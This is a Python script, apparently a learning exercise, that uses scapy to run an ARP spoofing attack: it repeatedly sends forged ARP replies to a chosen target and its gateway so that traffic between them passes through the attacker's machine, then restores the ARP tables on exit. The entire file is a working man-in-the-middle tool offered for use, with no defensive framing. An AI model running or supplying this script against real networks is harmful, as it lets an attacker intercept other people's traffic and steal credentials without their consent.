import scapy.all as scapy
import time
import optparse
def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip,poisoned_ip):

    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(pdst=target_ip,op=2,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)

def reseting(fooled_ip,gateway_ip):

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(pdst=fooled_ip,op=2,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=5)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="enter target ip")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="enter gateway ip")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Please enter target ip")

    if not options.gateway_ip:
        print("Please enter gateway ip")

    return options

number = 0

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip
try:

    while True:

        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)

        number += 2

        print("\rSending Packets " + str(number),end="")

        time.sleep(3)
except KeyboardInterrupt:
    print("\rExiting and Reseting")
    reseting(user_target_ip, user_gateway_ip)
    reseting(user_gateway_ip, user_target_ip)